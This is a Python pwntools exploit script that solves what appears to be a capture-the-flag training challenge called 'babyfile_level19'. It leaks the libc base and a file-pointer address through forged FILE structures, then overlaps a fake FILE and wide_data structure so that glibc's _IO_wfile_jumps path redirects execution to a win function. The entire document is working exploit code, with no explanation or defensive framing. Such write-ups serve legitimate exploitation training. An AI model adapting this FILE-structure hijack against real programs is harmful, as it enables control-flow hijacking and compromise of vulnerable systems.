# leak puts@libc addr -> put fake FILE struct in .bss -> wide_data attack

from pwn import *

context.arch = 'amd64'

p = process("/challenge/babyfile_level19")
#p = gdb.debug("/challenge/babyfile_level19")
binary = ELF("/challenge/babyfile_level19")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# dummy note
p.sendline(b'new_note')
p.sendline(b'0')
p.sendline(b'8')
p.recv()

win_addr = binary.sym['win']
puts_got = binary.got.puts

# leak libc addr
p.sendline(b'open_file')
p.sendline(b'write_fp')
p.recv()

fs = FileStructure()
payload = fs.write(puts_got, 8)
p.send(payload)
p.recv()

p.sendline(b'write_file')
p.sendline(b'0')
p.recvuntil(b';\n')
puts_leak = p.recv()[:8]
libc_base = unpack(puts_leak, 'all') - libc.sym['puts']
libc.address = libc_base
print(f'libc_base = {hex(libc_base)}')

# leak fp address
p.sendline(b'open_file')
p.sendline(b'write_fp')
p.recv()

fp = binary.sym.fp
fs = FileStructure()
payload = fs.write(fp, 8)
p.send(payload)
p.recv()

p.sendline(b'write_file')
p.sendline(b'0')
p.recvuntil(b';\n')
fp_leak = p.recv()[:8]
fp_leak = unpack(fp_leak, 'all') + 0x1e0
print(f'fp_leak = {hex(fp_leak)}')

# overlapped file struct and wide_data in fp buffer
_wide_vtable_offset = 0xe0
doallocbuf_call_offset = 0x68

fs = FileStructure()
fs.vtable = libc.sym['_IO_wfile_jumps'] + 24 - 0x38 # fwrite calling vtable + 0x38
fs._lock = fp_leak - 0x1f0 - 0x2a0 - 0x10 # beginning of heap
fs._wide_data = fp_leak + _wide_vtable_offset

_wide_vtable_loc = fp_leak + _wide_vtable_offset # point back to wide_data pointer

payload = bytes(fs) + b"\x00" * doallocbuf_call_offset + p64(binary.sym.win) # will be wide_data.vtable + 0x68
payload += b"\x00" * (_wide_vtable_offset - doallocbuf_call_offset - 0x8) + p64(_wide_vtable_loc) # wide_data.vtable pointing back to wide_data

p.sendline(b'open_file')
p.sendline(b'write_fp')
p.recv()
p.send(payload)

p.interactive()
